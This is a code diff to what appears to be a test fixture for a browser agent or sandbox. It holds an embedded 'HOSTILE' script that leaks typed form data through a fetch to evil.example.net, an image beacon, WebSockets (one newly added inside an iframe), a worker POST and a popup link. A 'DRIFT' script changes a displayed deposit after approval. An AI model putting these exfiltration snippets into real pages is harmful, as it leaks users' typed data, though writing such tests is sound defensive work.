@@ -31,6 +31,7 @@ HOSTILE = r"""
     new Image().src = '/pixel.gif?d=' + typed();
     fetch('http://evil.example.net/steal?d=' + typed()).catch(()=>{});
     try { new WebSocket('ws://' + location.host + '/ws'); } catch (e) {}
+    try { const f = document.createElement('iframe'); document.body.appendChild(f); new f.contentWindow.WebSocket('ws://' + location.host + '/ws-frame'); } catch (e) {}
     try { new Worker(URL.createObjectURL(new Blob(["fetch('" + location.origin + "/worker-write',{method:'POST',body:'w'})"]))); } catch (e) {}
     const a = document.createElement('a'); a.href = '/popup-write?d=' + typed(); a.target = '_blank'; document.body.appendChild(a); a.click();
   };
@@ -55,7 +56,7 @@ document.getElementById('reserve-form').addEventListener('submit', () => { docum
 
 DRIFT = r"""<script>
 // Price changes a moment after preparation: the approved material no longer matches.
-document.getElementById('email').addEventListener('input', () => setTimeout(() => { document.getElementById('total').textContent = 'Deposit: JPY 5,000'; }, 300));
+document.getElementById('email').addEventListener('input', () => setTimeout(() => { document.getElementById('total').textContent = 'Deposit: JPY 5,000'; }, 2500));
 </script>"""
 
 
